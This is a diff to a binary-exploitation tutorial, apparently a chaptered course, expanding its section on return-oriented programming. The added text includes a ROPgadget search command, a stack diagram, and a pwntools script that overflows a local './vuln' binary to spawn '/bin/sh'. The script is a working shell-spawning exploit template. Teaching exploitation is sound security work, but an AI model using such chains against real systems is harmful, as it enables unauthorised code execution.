@@ -383,7 +383,62 @@ Documentation: https://en.wikipedia.org/wiki/Address_space_layout_randomization
 
 ### ROP (Gadgets)
 
-The goal of this attack (similar to ret2libc), is to redirect the execution flow, over several program sections that enable code execution, by chaining small portion of instructions.
+When NX stops you injecting shellcode, ret2libc lets you call *one* function. ROP
+generalises this: instead of one address, you put a *chain* of addresses on the
+stack. Each points to a **gadget** — a few instructions already in the binary
+that end in `ret`. Because each gadget ends in `ret`, control flows from one
+gadget to the next automatically (each `ret` pops the next address off the
+stack), letting you assemble arbitrary behaviour out of borrowed fragments.
+
+#### Finding gadgets
+
+```sh
+ROPgadget --binary ./vuln | grep ': pop rdi ; ret'
+# 0x0000000000401234 : pop rdi ; ret
+```
+
+A `pop rdi ; ret` gadget is the classic one on x86-64: it lets you load a chosen
+value into `rdi` (the first argument register — chapter `0x04`) and then
+continue the chain.
+
+#### A minimal chain: `system("/bin/sh")`
+
+To call `system("/bin/sh")` you need `rdi` to point at the string `"/bin/sh"`,
+then to jump to `system`. The stack you build (overwriting from the return
+address onward) looks like:
+
+```
++--------------------------+
+| address of: pop rdi; ret |  <- ret lands here first
++--------------------------+
+| address of "/bin/sh"     |  <- popped into rdi by the gadget
++--------------------------+
+| address of system()      |  <- gadget's ret jumps here, now rdi is set
++--------------------------+
+```
+
+With pwntools (chapter `0x03`) you rarely lay this out by hand — its `ROP`
+object finds gadgets and builds the chain for you:
+
+```python
+from pwn import *
+
+elf  = context.binary = ELF('./vuln')
+libc = elf.libc
+
+rop = ROP(elf)
+rop.raw(b'A' * offset)          # padding up to the return address
+rop.system(next(libc.search(b'/bin/sh')))   # arranges pop rdi + system
+
+io = process('./vuln')
+io.sendline(rop.chain())
+io.interactive()
+```
+
+> Real chains are longer: you often first leak a libc address (e.g. by ROP-ing a
+> call to `puts(got_entry)`) to defeat ASLR, then send a second stage using the
+> now-known libc base. ROP is Turing-complete in practice — whole exploits run
+> without executing a single byte you supplied.
 
 Project: https://github.com/JonathanSalwan/ROPgadget
 Documentation: https://en.wikipedia.org/wiki/Return-oriented_programming
